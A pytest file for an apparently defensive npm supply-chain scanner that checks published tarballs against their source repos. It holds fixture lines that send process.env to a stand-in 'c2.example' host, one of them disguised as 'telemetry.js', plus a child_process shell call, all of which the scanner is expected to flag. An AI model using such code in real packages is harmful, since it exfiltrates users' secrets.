"""npm ecosystem: repo URL parsing, tarball unpacking, JS risk and raw hashing."""

from __future__ import annotations

import io
import tarfile

import pytest

from phantom import cli, core
from phantom.ecosystems import forges
from phantom.ecosystems.base import Fetcher, SourceResolver
from phantom.ecosystems.forges import untar
from phantom.ecosystems.npm import JS_EXTENSIONS, NpmFetcher, NpmSourceResolver
from phantom.models import (
    Artifact,
    FileEntry,
    FindingType,
    NoSource,
    Severity,
    SourceTree,
)
from phantom.normalizers.raw import RawNormalizer
from phantom.risk import assess

from conftest import FakeEcosystem


def _owner_name(url):
    repo = forges.parse_repo(url)
    return (repo.owner, repo.name) if repo else None


@pytest.mark.parametrize(
    ("url", "expected"),
    [
        ("git+https://github.com/o/r.git", ("o", "r")),
        ("git://github.com/o/r.git", ("o", "r")),
        ("git@github.com:o/r.git", ("o", "r")),
        ("git+ssh://git@github.com/o/r.git", ("o", "r")),
        ("github:o/r", ("o", "r")),
        ("o/r", ("o", "r")),
        ("https://github.com/o/r", ("o", "r")),
    ],
)
def test_parse_repo_url_npm_forms(url, expected):
    assert _owner_name(url) == expected


def _resolve(metadata: dict):
    repo = forges.find_repo(NpmSourceResolver._candidate_urls(metadata))
    return (repo.owner, repo.name) if repo else None


def test_find_github_repo_from_manifest():
    assert _resolve(
        {"repository": {"type": "git", "url": "git+https://github.com/o/r.git"}}
    ) == ("o", "r")
    assert _resolve({"repository": "github:o/r"}) == ("o", "r")
    assert _resolve({"homepage": "https://github.com/o/r#readme"}) == ("o", "r")
    assert _resolve({"repository": None}) is None


def test_gitlab_repo_parsing_and_archive_url():
    repo = forges.parse_repo("https://gitlab.com/group/project")
    assert (repo.host, repo.owner, repo.name) == ("gitlab.com", "group", "project")
    assert repo.url == "https://gitlab.com/group/project"
    archive = repo.forge._archive_url(repo, "v1.0.0")
    assert "gitlab.com/api/v4/projects/group%2Fproject" in archive
    assert archive.endswith("archive.tar.gz?sha=v1.0.0")


def test_gitlab_subgroup_parsing():
    repo = forges.parse_repo("https://gitlab.com/group/subgroup/project.git")
    assert (repo.owner, repo.name) == ("group/subgroup", "project")


def test_npm_registry_url_override():
    assert NpmFetcher().registry_url == "https://registry.npmjs.org"
    assert (
        NpmFetcher(registry_url="https://npm.internal/registry/").registry_url
        == "https://npm.internal/registry"
    )


def test_untar_strips_top_level_directory():
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        data = b"module.exports = 1;\n"
        info = tarfile.TarInfo("package/index.js")
        info.size = len(data)
        archive.addfile(info, io.BytesIO(data))
    files = untar(buffer.getvalue())
    assert files == [FileEntry("index.js", b"module.exports = 1;\n")]


def test_raw_normalizer_ignores_line_endings():
    normalizer = RawNormalizer(JS_EXTENSIONS)
    unix = FileEntry("a.js", b"const x = 1;\nconst y = 2;\n")
    windows = FileEntry("b.js", b"const x = 1;\r\nconst y = 2;\r\n")
    assert normalizer.normalized_hash(unix) == normalizer.normalized_hash(windows)
    assert normalizer.applies_to(FileEntry("m.mjs", b""))
    assert not normalizer.applies_to(FileEntry("m.py", b""))


def test_js_risk_classification():
    stealer = FileEntry(
        "x.js", b"fetch('https://c2.example/x', {body: JSON.stringify(process.env)});\n"
    )
    assert assess(stealer).severity == Severity.CRITICAL

    shell = FileEntry("x.js", b"require('child_process').execSync('id');\n")
    assert assess(shell).severity == Severity.HIGH

    clean = FileEntry("x.js", b"module.exports = (a, b) => a + b;\n")
    assert assess(clean).severity == Severity.MEDIUM


def test_npm_spec_parsing():
    assert cli._parse_spec("left-pad@1.3.0", "npm") == ("left-pad", "1.3.0")
    assert cli._parse_spec("@scope/pkg@1.0.0", "npm") == ("@scope/pkg", "1.0.0")
    with pytest.raises(ValueError):
        cli._parse_spec("left-pad@1.3.0", "pypi")


class _JsFetcher(Fetcher):
    def __init__(self, files: list[FileEntry]):
        self.files = files

    def fetch_artifact(self, pkg: str, version: str) -> Artifact:
        return Artifact(pkg, version, f"{pkg}-{version}.tgz", self.files, {})


class _JsResolver(SourceResolver):
    def __init__(self, files: list[FileEntry]):
        self.files = files

    def resolve_source(self, pkg, version, metadata) -> SourceTree | NoSource:
        return SourceTree("https://github.com/o/r", f"v{version}", self.files)


def test_npm_scan_flags_injected_js():
    source = [FileEntry("index.js", b"module.exports = (a, b) => a + b;\n")]
    artifact = source + [
        FileEntry(
            "telemetry.js",
            b"fetch('https://c2.example/x', {body: JSON.stringify(process.env)});\n",
        )
    ]
    ecosystem = FakeEcosystem(
        _JsFetcher(artifact),
        _JsResolver(source),
        normalizers=[RawNormalizer(JS_EXTENSIONS)],
        name="npm",
    )
    result = core.scan("leftpad", "1.0.0", ecosystem)
    assert len(result.findings) == 1
    finding = result.findings[0]
    assert finding.type == FindingType.PHANTOM_FILE
    assert finding.path == "telemetry.js"
    assert finding.severity == Severity.CRITICAL
